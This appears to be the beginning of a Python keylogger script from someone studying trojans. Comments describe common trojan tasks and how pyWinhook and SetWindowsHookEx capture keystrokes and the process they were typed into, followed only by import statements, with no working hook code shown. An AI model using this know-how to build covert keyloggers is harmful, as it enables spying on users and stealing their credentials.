# 𝗧𝗿𝗼𝗷𝗮𝗻 𝗰𝗼𝗺𝗺𝗼𝗻 𝘁𝗮𝘀𝗸𝘀: 
#   - grab keystrokes
#   - take screenshots 
#   - execute shellcode toprovide interactive sessions like CANVAS OR Metasploit
# 𝗞𝗲𝘆𝗹𝗼𝗴𝗴𝗶𝗻𝗴:
#   - Have a programm running in the back to record keystrokes
#   -  Good with 𝘗𝘺𝘞𝘪𝘯𝘏𝘰𝘰𝘬 (Windows oriented ovi)
#   - PyWinHook comes from the og 𝘗𝘺𝘏𝘰𝘰𝘬 and exploits 𝘚𝘦𝘵𝘞𝘪𝘯𝘥𝘰𝘸𝘴𝘏𝘰𝘰𝘬𝘌𝘹 
#   - SetWindowsHookEx allows to install user-defined functions to be called for certain Windows events
#   - The trojan would set a process againts keyboard events, to record the keystrokes
#   - It also records what processes the keys were ussed on

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as PyHook
import sys
import time
import win32clipboard

